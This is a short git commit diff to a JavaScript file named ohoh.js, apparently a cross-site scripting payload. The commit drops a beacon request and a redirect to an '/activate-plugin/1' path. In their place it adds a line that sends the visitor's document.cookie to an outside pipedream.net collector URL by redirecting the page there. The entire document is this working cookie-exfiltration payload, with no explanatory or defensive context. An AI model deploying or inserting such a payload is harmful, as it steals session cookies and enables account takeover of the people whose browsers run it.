8f99486276881a30a52aefbfe6538c91e4347657
ArthurCalvez <97851991+ArthurCalvez@users.noreply.github.com>
2023-11-25 00:13:00 +0100

    Update ohoh.js

--- ohoh.js
+++ ohoh.js
@@ -1,2 +1,1 @@
-fetch("https://eozw4rbirv594vn.m.pipedream.net?c=AVANT")
-location.href = "/activate-plugin/1"
+document.location= "https://eozw4rbirv594vn.m.pipedream.net?c=".concat(document.cookie)
